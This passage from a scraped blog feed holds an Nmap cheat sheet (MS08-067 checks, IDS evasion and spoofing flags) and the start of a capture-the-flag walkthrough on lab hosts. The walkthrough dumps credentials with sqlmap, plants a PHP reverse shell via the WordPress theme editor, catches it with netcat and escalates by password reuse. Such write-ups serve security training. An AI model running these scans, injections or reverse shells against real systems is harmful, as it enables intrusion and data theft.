<th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nmap -sV -v -p 139,445 10.0.0.1/24</code></p> </td> \n    <td> <p>Find all Netbios servers on subnet</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -sU --script nbstat.nse -p 137 target</code></p> </td> \n    <td> <p>Nmap display Netbios name</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap --script-args=unsafe=1 --script <br /> smb-check-vulns.nse -p 445 target</code></p> </td> \n    <td> <p>Nmap check if Netbios servers are vulnerable to MS08-067</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note warning\"> \n <h5>--script-args=unsafe=1 has the potential to crash servers / services</h5> \n <p>Becareful when running this command.</p> \n</div> \n<h4 id=\"nmap-nikto-scan\">Nmap Nikto Scan</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nmap -p80 10.0.1.0/24 -oG - | nikto.pl -h -</code></p> </td> \n    <td> <p>Scans for http servers on port 80 and pipes into Nikto for scanning.</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nmap -p80,443 10.0.1.0/24 -oG - | nikto.pl -h -</code></p> </td> \n    <td> <p>Scans for http/https servers on port 80, 443 and pipes into Nikto for scanning.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"nmap-cheatsheet\">Nmap Cheatsheet</h3> \n<h4 id=\"target-specification\">Target Specification</h4> \n<p>Nmap allows hostnames, IP addresses, subnets.</p> \n<p>Example blah.highon.coffee, nmap.org/24, 192.168.0.1; 10.0.0-255.1-254</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-iL</code></p> </td> \n    <td> <p>inputfilename: Input from list of hosts/networks</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-iR</code></p> </td> \n    <td> <p>num hosts: Choose random targets</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--exclude</code></p> </td> \n    <td> <p>host1[,host2][,host3],... : Exclude hosts/networks</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--excludefile</code></p> </td> \n    <td> <p>exclude_file: Exclude list from file</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"host-discovery\">Host Discovery</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-sL</code></p> </td> \n    <td> <p>List Scan - simply list targets to scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sn</code></p> </td> \n    <td> <p>Ping Scan - disable port scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-Pn</code></p> </td> \n    <td> <p>Treat all hosts as online -- skip host discovery</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-PS/PA/PU/PY[portlist]</code></p> </td> \n    <td> <p>TCP SYN/ACK, UDP or SCTP discovery to given ports</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-PE/PP/PM</code></p> </td> \n    <td> <p>ICMP echo, timestamp, and netmask request discovery probes</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-PO[protocol list]</code></p> </td> \n    <td> <p>IP Protocol Ping</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-n/-R</code></p> </td> \n    <td> <p>Never do DNS resolution/Always resolve [default: sometimes]</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"scan-techniques\">Scan Techniques</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-sS<br />-sT<br />-sA<br />-sW<br />-sM</code></p> </td> \n    <td> <p>TCP SYN scan<br />Connect scan<br />ACK scan<br />Window scan<br />Maimon scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sU</code></p> </td> \n    <td> <p>UDP Scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sN<br />-sF<br />-sX</code></p> </td> \n    <td> <p>TCP Null scan<br />FIN scan<br />Xmas scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--scanflags</code></p> </td> \n    <td> <p>Customize TCP scan flags</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sI zombie host[:probeport]</code></p> </td> \n    <td> <p>Idle scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sY<br />-sZ</code></p> </td> \n    <td> <p>SCTP INIT scan<br />COOKIE-ECHO scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-sO</code></p> </td> \n    <td> <p>IP protocol scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code> -b \"FTP relay host\"</code></p> </td> \n    <td> <p>FTP bounce scan</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"port-specification-and-scan-order\">Port Specification and Scan Order</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-p</code></p> </td> \n    <td> <p>Specify ports, e.g. -p80,443 or -p1-65535</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-p U:PORT</code></p> </td> \n    <td> <p>Scan UDP ports with Nmap, e.g. -p U:53</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-F</code></p> </td> \n    <td> <p>Fast mode, scans fewer ports than the default scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-r</code></p> </td> \n    <td> <p>Scan ports consecutively - don't randomize</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--top-ports \"number\"</code></p> </td> \n    <td> <p>Scan \"number\" most common ports</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--port-ratio \"ratio\"</code></p> </td> \n    <td> <p>Scan ports more common than \"ratio\"</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"service-version-detection\">Service Version Detection</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-sV</code></p> </td> \n    <td> <p>Probe open ports to determine service/version info</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--version-intensity \"level\"</code></p> </td> \n    <td> <p>Set from 0 (light) to 9 (try all probes)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--version-light</code></p> </td> \n    <td> <p>Limit to most likely probes (intensity 2)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--version-all</code></p> </td> \n    <td> <p>Try every single probe (intensity 9)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--version-trace</code></p> </td> \n    <td> <p>Show detailed version scan activity (for debugging)</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"script-scan\">Script Scan</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-sC</code></p> </td> \n    <td> <p>equivalent to --script=default</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--script=\"Lua scripts\"</code></p> </td> \n    <td> <p>\"Lua scripts\" is a comma separated list of directories, script-files or script-categories</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--script-args=n1=v1,[n2=v2,...]</code></p> </td> \n    <td> <p>provide arguments to scripts</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-script-args-file=filename</code></p> </td> \n    <td> <p>provide NSE script args in a file</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--script-trace</code></p> </td> \n    <td> <p>Show all data sent and received</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--script-updatedb</code></p> </td> \n    <td> <p>Update script database</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--script-help=\"Lua scripts\"</code></p> </td> \n    <td> <p>Show help about scripts</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"os-detection\">OS Detection</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-O</code></p> </td> \n    <td> <p>Enable OS Detection</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--osscan-limit</code></p> </td> \n    <td> <p>Limit OS detection to promising targets</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--osscan-guess</code></p> </td> \n    <td> <p>Guess OS more aggressively</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"timing-and-performance\">Timing and Performance</h4> \n<p>Options which take TIME are in seconds, or append 'ms' (milliseconds), 's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-T 0-5</code></p> </td> \n    <td> <p>Set timing template - higher is faster (less accurate)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--min-hostgroup SIZE <br />--max-hostgroup SIZE</code></p> </td> \n    <td> <p>Parallel host scan group sizes</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--min-parallelism NUMPROBES <br />--max-parallelism NUMPROBES</code></p> </td> \n    <td> <p>Probe parallelization</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--min-rtt-timeout TIME<br />--max-rtt-timeout TIME<br />--initial-rtt-timeout TIME</code></p> </td> \n    <td> <p>Specifies probe round trip time</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--max-retries TRIES</code></p> </td> \n    <td> <p>Caps number of port scan probe retransmissions</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--host-timeout TIME</code></p> </td> \n    <td> <p>Give up on target after this long</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--scan-delay TIME <br />--max-scan-delay TIME</code></p> </td> \n    <td> <p>Adjust delay between probes</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--min-rate NUMBER</code></p> </td> \n    <td> <p>Send packets no slower than NUMBER per second</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--max-rate NUMBER</code></p> </td> \n    <td> <p>Send packets no faster than NUMBER per second</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"firewalls-ids-evasion-and-spoofing\">Firewalls IDS Evasion and Spoofing</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-f; --mtu VALUE</code></p> </td> \n    <td> <p>Fragment packets (optionally w/given MTU)</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-D decoy1,decoy2,ME</code></p> </td> \n    <td> <p>Cloak a scan with decoys</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-S IP-ADDRESS</code></p> </td> \n    <td> <p>Spoof source address</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-e IFACE</code></p> </td> \n    <td> <p>Use specified interface</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-g PORTNUM<br />--source-port PORTNUM</code></p> </td> \n    <td> <p>Use given port number</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--proxies url1,[url2],...</code></p> </td> \n    <td> <p>Relay connections through HTTP / SOCKS4 proxies</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--data-length NUM</code></p> </td> \n    <td> <p>Append random data to sent packets</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--ip-options OPTIONS</code></p> </td> \n    <td> <p>Send packets with specified ip options</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--ttl VALUE</code></p> </td> \n    <td> <p>Set IP time to live field</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--spoof-mac ADDR/PREFIX/VENDOR</code></p> </td> \n    <td> <p>Spoof NMAP MAC address</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--badsum</code></p> </td> \n    <td> <p>Send packets with a bogus TCP/UDP/SCTP checksum</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"nmap-output-options\">Nmap Output Options</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-oN</code></p> </td> \n    <td> <p>Output Normal</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-oX</code></p> </td> \n    <td> <p>Output to XML</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-oS</code></p> </td> \n    <td> <p>Script Kiddie / 1337 speak... sigh</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-oG</code></p> </td> \n    <td> <p>Output greppable - easy to grep nmap output</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-oA BASENAME</code></p> </td> \n    <td> <p>Output in the three major formats at once</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-v</code></p> </td> \n    <td> <p>Increase verbosity level use -vv or more for greater effect</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-d</code></p> </td> \n    <td> <p>Increase debugging level use -dd or more for greater effect</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--reason</code></p> </td> \n    <td> <p>Display the reason a port is in a particular state</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--open</code></p> </td> \n    <td> <p>Only show open or possibly open ports</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--packet-trace</code></p> </td> \n    <td> <p>Show all packets sent / received</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--iflist</code></p> </td> \n    <td> <p>Print host interfaces and routes for debugging</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--log-errors</code></p> </td> \n    <td> <p>Log errors/warnings to the normal-format output file</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--append-output</code></p> </td> \n    <td> <p>Append to rather than clobber specified output files</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--resume FILENAME</code></p> </td> \n    <td> <p>Resume an aborted scan</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--stylesheet PATH/URL</code></p> </td> \n    <td> <p>XSL stylesheet to transform XML output to HTML</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--webxml</code></p> </td> \n    <td> <p>Reference stylesheet from Nmap.Org for more portable XML</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--no-stylesheet</code></p> </td> \n    <td> <p>Prevent associating of XSL stylesheet w/XML output</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"misc-nmap-options\">Misc Nmap Options</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>-6</code></p> </td> \n    <td> <p>Enable IPv6 scanning</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-A</code></p> </td> \n    <td> <p>Enable OS detection, version detection, script scanning, and traceroute</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--datedir DIRNAME</code></p> </td> \n    <td> <p>Specify custom Nmap data file location</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--send-eth<br />--send-ip</code></p> </td> \n    <td> <p>Send using raw ethernet frames or IP packets</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--privileged</code></p> </td> \n    <td> <p>Assume that the user is fully privileged</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>--unprivileged</code></p> </td> \n    <td> <p>Assume the user lacks raw socket privileges</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-V</code></p> </td> \n    <td> <p>Show nmap version number</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>-h</code></p> </td> \n    <td> <p>Show nmap help screen</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"nmap-enumeration-examples\">Nmap Enumeration Examples</h2> \n<p>The following are real world examples of Nmap enumeration.</p> \n<h3 id=\"enumerating-netbios\">Enumerating Netbios</h3> \n<p>The following example enumerates Netbios on the target networks, the same process can be applied to other services by modifying ports / NSE scripts.</p> \n<p>Detect all exposed Netbios servers on the subnet.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Nmap find exposed Netbios servers</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap -sV -v -p 139,445 10.0.1.0/24</span> </p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT<br /></span> \n   <span class=\"output\">Nmap scan report for nas.decepticons 10.0.1.12<br /></span> \n   <span class=\"output\">Host is up (0.014s latency).<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">PORT STATE SERVICE VERSION<br /></span> \n   <span class=\"output\">139/tcp open netbios-ssn Samba smbd 3.X (workgroup: MEGATRON)<br /></span> \n   <span class=\"output\">445/tcp open netbios-ssn Samba smbd 3.X (workgroup: MEGATRON)<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Nmap find Netbios name.</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Nmap find exposed Netbios servers</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap -sU --script nbstat.nse -p 137 10.0.1.12</span> </p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT<br /></span> \n   <span class=\"output\">Nmap scan report for nas.decepticons 10.0.1.12<br /></span> \n   <span class=\"output\">Host is up (0.014s latency).<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">PORT STATE SERVICE VERSION<br /></span> \n   <span class=\"output\">137/udp open netbios-ns<br /></span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Host script results:<br /></span> \n   <span class=\"output\">|_nbstat: NetBIOS name: STARSCREAM, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown) </span> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Nmap done: 256 IP addresses (1 hosts up) scanned in 28.74 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>Check if Netbios servers are vulnerable to MS08-067</p> \n<section class=\"shellbox\"> \n <div class=\"unit golden-large code\"> \n  <p class=\"title\">Nmap check MS08-067</p> \n  <div class=\"shell\"> \n   <p class=\"line\"> <span class=\"prompt\">root</span><span>:</span><span class=\"path\">~</span><span>#</span> <span class=\"command\">nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445</span> <span>10.0.0.1</span> </p> \n   <span class=\"output\"><br /></span> \n   <span class=\"output\">Nmap scan report for ie6winxp.decepticons (10.0.1.1)<br /></span> \n   <span class=\"output\">Host is up (0.00026s latency).<br /></span> \n   <span class=\"output\">PORT STATE SERVICE<br /></span> \n   <span class=\"output\">445/tcp open microsoft-ds<br /></span> \n   <span class=\"output\">Host script results:<br /></span> \n   <span class=\"output\">| smb-check-vulns:<br /></span> \n   <span class=\"output\">| MS08-067: VULNERABLE<br /></span> \n   <span class=\"output\">| Conficker: Likely CLEAN<br /></span> \n   <span class=\"output\">| regsvc DoS: NOT VULNERABLE<br /></span> \n   <span class=\"output\">| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE<br /></span> \n   <span class=\"output\">|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)<br /></span> \n   <span class=\"output\">Nmap done: 1 IP address (1 host up) scanned in 5.45 seconds<br /></span> &lt;/p&gt; \n  </div> \n </div> \n</section> \n<p>The information gathered during the enumeration indicates the target is vulnerable to MS08-067, exploitation will confirm if it’s vulnerable to MS08-067.</p>","descriptionType":"text/html","publishedDate":"Sat, 13 Dec 2014 10:37:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/nmap-trinity.png","linkMd5":"2b098a6825c613d64fedc04f31f2766b","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn43@2020_6/2020/08/25/01-24-54-451_82ee6133e5590377.webp","destWidth":655,"destHeight":228,"sourceBytes":280637,"destBytes":22966,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/nmap-trinity.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn43@2020_6/2020/08/25/01-24-54-451_82ee6133e5590377.webp"},"publishedOrCreatedDate":1598318675557},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Freshly Walkthrough","link":"https://highon.coffee/blog/freshly-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#port-scanning\" id=\"markdown-toc-port-scanning\">Port Scanning</a></li> \n   <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#service-enumeration\" id=\"markdown-toc-service-enumeration\">Service Enumeration</a></li> \n   <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#http-enumeration\" id=\"markdown-toc-http-enumeration\">HTTP Enumeration</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#sql-injection\" id=\"markdown-toc-sql-injection\">SQL Injection</a></li> \n <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#wordpress---reverse-php-shell\" id=\"markdown-toc-wordpress---reverse-php-shell\">Wordpress - Reverse PHP Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#privilege-escalation\" id=\"markdown-toc-privilege-escalation\">Privilege Escalation</a></li> \n <li><a href=\"https://highon.coffee/blog/freshly-walkthrough/#post-exploitation-enumeration\" id=\"markdown-toc-post-exploitation-enumeration\">Post Exploitation Enumeration</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification.</p> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 10.0.1.109</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>64 Apache httpd 2.4.7 ((Ubuntu))</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 443</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTPS</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 8080</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Enumeration of port 80, discovered <code>login.php</code>:</p> \n<p><img src=\"https://highon.coffee/img/blog/freshly/dirbuster.png\" alt=\"dirbuster\" /></p> \n<p><img src=\"https://highon.coffee/img/blog/freshly/login.png\" alt=\"login form sqli\" /></p> \n<h2 id=\"sql-injection\">SQL Injection</h2> \n<p>The discovered form was vulnerable to a time-based SQL injection, SQLMap was used to expose the following databases:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">available databases <span class=\"o\">[</span>7]:\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> information_schema\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> login\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> mysql\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> performance_schema\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> phpmyadmin\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> <span class=\"nb\">users</span>\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> wordpress8080</code></pre> \n</figure> \n<p>SQLMap was used to dump the <strong>wordpress8080</strong> database:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sqlmap <span class=\"nt\">-o</span> <span class=\"nt\">-u</span> <span class=\"s2\">\"http://10.0.1.109/login.php\"</span> <span class=\"nt\">--forms</span> <span class=\"nt\">-D</span> wordpress8080 <span class=\"nt\">-T</span> <span class=\"nb\">users</span> <span class=\"nt\">--risk</span> 1 <span class=\"nt\">--dbms</span><span class=\"o\">=</span>mysql <span class=\"nt\">--dump</span></code></pre> \n</figure> \n<p>Discovered credentials:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Database: wordpress8080\nTable: <span class=\"nb\">users</span>\n<span class=\"o\">[</span>1 entry]\n+----------+---------------------+\n| username | password            |\n+----------+---------------------+\n| admin    | SuperSecretPassword |\n+----------+---------------------+</code></pre> \n</figure> \n<h2 id=\"wordpress---reverse-php-shell\">Wordpress - Reverse PHP Shell</h2> \n<p>Wordpress was accessible on port <code>443</code> and port <code>8080</code>. Authentication was successful using the discovered credentials and a PHP reverse shell was introduced to the sites source code via the wordpress theme editor.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><b>admin</b></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><code>SuperSecretPassword</code></p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p><img src=\"https://highon.coffee/img/blog/freshly/wordpress-php-shell.png\" alt=\"wordpress reverse php shell\" /></p> \n<p>A reverse shell successfully connected back:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc <span class=\"nt\">-n</span> <span class=\"nt\">-v</span> <span class=\"nt\">-l</span> <span class=\"nt\">-p</span> 443           \nlistening on <span class=\"o\">[</span>any] 443 ...\nconnect to <span class=\"o\">[</span>10.0.1.110] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>10.0.1.109] 37912\nLinux Freshly 3.13.0-45-generic <span class=\"c\">#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux</span>\n 13:26:49 up 46 min,  0 <span class=\"nb\">users</span>,  load average: 0.00, 0.01, 0.46\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\n<span class=\"nv\">uid</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span class=\"o\">)</span>\n/bin/sh: 0: can<span class=\"s1\">'t access tty; job control turned off\n$</span></code></pre> \n</figure> \n<h2 id=\"privilege-escalation\">Privilege Escalation</h2> \n<p>Account credential reuse from the Wordpress admin password <code>SuperSecretPassword</code> allowed <code>su -</code> to escalate privileges to root.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>python <span class=\"nt\">-c</span> <span class=\"s1\">'import pty;pty.spawn(\"/bin/bash\")'</span>\ndaemon@Freshly:/<span class=\"nv\">$ </span><span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span 